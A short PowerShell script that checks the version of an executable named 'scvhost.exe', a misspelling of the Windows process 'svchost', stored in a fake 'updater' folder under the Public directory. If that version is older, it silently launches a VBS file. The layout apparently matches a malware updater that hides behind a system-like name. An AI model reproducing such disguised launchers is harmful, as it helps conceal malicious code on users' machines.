function Get-FileVersionInfo            
{            
  param(            
    [Parameter(Mandatory=$true)]            
     [string]$FileName)            

  if(!(test-path $filename)) {            
  write-host "File not found"            
  return $null            
  }            

  return [System.Diagnostics.FileVersionInfo]::GetVersionInfo($FileName)            

}

$file = Get-FileVersionInfo("$env:Public\Windows\updater\svchost\scvhost.exe")
    $version = [System.Version]::Parse("19.4.191.2")
if($file.ProductVersion -gt $version) {
	echo higher
}
elseif($file.ProductVersion -eq $version) {
    echo equal
	
}
else {
    start "$env:Public\Windows\updater\pingUpdate\cekOS\cekOS.vbs"
}

echo "Product version is:" $file.ProductVersion
